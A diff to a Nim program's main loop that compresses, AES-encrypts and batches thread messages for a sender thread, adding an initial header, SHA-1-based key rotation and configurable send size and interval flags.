@@ -168,12 +168,8 @@ when USE_CONNECTED_DEVICES_THREAD:
 
   createThread(connectedDevicesThreadVar, initConnectedDevicesThread)
 
-from os import sleep
-from lib/functions/generateHeader import header
-
 var prevThread: string = ""
-var header: string = header()
-var res: string = header
+var res: string = ""
 
 from lib/threads/sendThread import initSendThread
 from lib/channels import sendThreadChannel
@@ -185,7 +181,28 @@ open sendThreadChannel
 createThread(sendThreadVar, initSendThread)
 
 import lib/more/zlibstatic/src/zlibstatic/zlib
-import lib/functions/encryptAES
+import lib/functions/aes
+from lib/functions/generateHeader import header
+
+# send header
+
+let headerContent: string = header()
+
+sendThreadChannel.send encrypt compress(headerContent, stream = RAW_DEFLATE)
+
+from std/sha1 import secureHash
+from std/sha1 import `$`
+
+# generate new key
+config.key = $secureHash headerContent & config.key & config.aad & config.iv
+
+from os import sleep
+from lib/flags import SEND_SIZE
+from lib/flags import TICK_INTERVAL
+from lib/flags import SEND_INTERVAL
+
+var TICKS: int = 0
+var finalData: string
 
 # wait for thread messages
 while true:
@@ -199,13 +216,19 @@ while true:
       res.add "." & thread & ","
     res.add ";" & data
 
-    let finalData: string = encrypt compress(res, stream = RAW_DEFLATE)
+    finalData = encrypt compress(res, stream = RAW_DEFLATE)
 
-    if finalData.len > 1000:
+    if finalData.len > SEND_SIZE:
       sendThreadChannel.send finalData
-      res = header
-  ## TODO: n as vrea sa folosesc sleep(10)
-  ## asa ca e probabil sa modifc aici oricand
-  sleep(10)
+      TICKS = 0
+      res = ""
+
+  if TICKS == SEND_INTERVAL:
+    sendThreadChannel.send finalData
+    TICKS = 0
+    res = ""
+
+  sleep(TICK_INTERVAL)
+  TICKS += 1
 
 close mainChannel
